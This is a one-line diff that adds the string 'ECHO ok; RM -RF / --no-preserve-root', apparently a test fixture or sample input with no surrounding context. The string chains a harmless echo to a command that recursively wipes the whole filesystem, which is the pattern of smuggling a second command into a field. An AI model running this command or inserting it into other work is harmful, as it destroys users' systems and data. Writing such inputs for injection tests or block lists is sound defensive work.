@@ -1,0 +1,1 @@
+ECHO ok; RM -RF / --no-preserve-root
